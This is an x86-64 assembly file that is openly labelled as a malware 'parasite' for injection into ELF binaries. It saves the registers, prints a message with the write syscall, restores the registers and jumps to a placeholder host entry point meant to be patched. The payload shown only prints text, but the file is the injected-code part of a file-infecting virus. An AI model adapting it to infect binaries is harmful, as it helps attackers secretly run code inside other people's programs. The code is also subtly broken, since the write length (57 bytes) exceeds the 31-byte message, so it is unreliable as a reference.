BITS 64


global _start


section .text


;MAIN
_start:

	push rax
	push rcx
	push rdx
	push rsi
	push rdi
	push r11

	
	jmp	malware
	message:	db	"*this is the payload speaking*", 0xa


malware: ;parasite function


	xor	rax, rax					
	add	rax, 0x1
	mov rdi, rax					
	lea rsi, [rel message]			
								
	xor rdx, rdx
	mov dl, 0x39				
	syscall					


	; Restoring registers from stack
	pop r11
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rax

	
	; jmp to host entry point(will be changed)
	mov	rbx, 0xAAAAAAAAAAAAAAAA		
	jmp	rbx

